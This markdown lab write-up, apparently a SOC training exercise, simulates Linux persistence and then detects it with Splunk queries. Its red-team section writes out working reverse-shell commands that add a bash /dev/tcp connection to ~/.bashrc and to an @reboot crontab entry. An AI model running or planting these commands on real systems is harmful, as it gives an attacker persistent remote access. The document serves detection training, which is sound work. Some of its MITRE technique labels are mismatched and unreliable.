# Persistence Detection – MITRE T1059.003 & T1546.001

## 🎯 Objective

Simulate and detect persistence techniques involving `.bashrc` and `crontab`, which are commonly abused by attackers to maintain access after initial compromise.

---

## 🧪 Red Team Simulation

### 1. Add Reverse Shell to `.bashrc`

echo 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1' >> ~/.bashrc

### 2. Schedule Reverse Shell via Cron

(crontab -l 2>/dev/null; echo "@reboot bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1'") | crontab -

### 3. Simulate Log Events with Logger

logger "Persistence: Reverse shell payload added to .bashrc"

logger "Persistence: Crontab @reboot reverse shell configured"

---

## 📊 Blue Team Detection – Splunk Queries

🔍 Detect .bashrc or Crontab Persistence

index=* ("@reboot" OR "crontab" OR "cron" OR "reverse shell" OR ".bashrc" OR "/dev/tcp" OR "Persistence")

| table _time, host, user, message

| sort _time

🔍 Detect Logger-Simulated Persistence Events

index=* "Persistence"

| table _time, host, user, message

---

## 🛡️ MITRE ATT&CK Mapping

Technique ID	Name

T1059.003	Command and Scripting Interpreter: Bash

T1546.001	Event Triggered Execution: Reboot Persistence via Cron

---

## 📸 Screenshots (Attach in /screenshots folder)

bashrc_persistence.png – Shows reverse shell added to .bashrc

crontab_persistence.png – Confirms @reboot job exists

logger_events.png – Terminal with logger commands

splunk_query_results.png – Detection output in Splunk

---

## 📚 Summary

These persistence methods are frequently used by attackers and malware. As a SOC Analyst, it’s critical to monitor:

Changes to .bashrc, .profile, /etc/profile

Suspicious cron jobs (especially @reboot)

Reverse shell patterns like /dev/tcp or bash -i

Detection and alerting for such behaviors can stop long-term footholds and backdoors.
